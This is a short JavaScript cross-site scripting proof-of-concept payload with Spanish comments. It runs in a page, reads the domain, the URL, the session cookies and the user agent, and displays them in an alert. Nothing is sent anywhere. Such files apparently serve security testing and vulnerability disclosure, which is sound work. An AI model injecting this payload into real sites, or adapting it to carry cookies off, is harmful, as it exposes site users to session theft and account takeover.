// PoC XSS Payload
console.log("XSS ejecutado exitosamente en:", document.domain);

// Información básica del dominio y cookies
const info = "Dominio: " + document.domain + "\n" + 
             "URL: " + window.location.href + "\n" + 
             "Cookies: " + document.cookie + "\n" +
             "User Agent: " + navigator.userAgent;

alert("XSS PoC Ejecutado \n\n" + info);
